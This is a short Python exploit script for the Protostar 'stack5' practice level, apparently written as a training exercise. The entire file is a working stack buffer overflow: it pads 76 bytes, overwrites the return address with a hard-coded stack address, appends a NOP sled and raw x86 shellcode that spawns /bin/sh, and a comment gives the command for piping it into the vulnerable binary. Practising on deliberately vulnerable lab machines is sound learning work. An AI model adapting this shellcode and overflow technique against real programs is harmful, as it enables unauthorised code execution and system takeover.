#! /usr/bin/python
import struct

#execution  (python stack5Exploit.py;cat) | /opt/protostar/bin/stack5
oversize="A"*76
#0xbffff7b0
eip=struct.pack("I",0xbffff7b0+40)
payload="\x90"*300+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print oversize+eip+payload
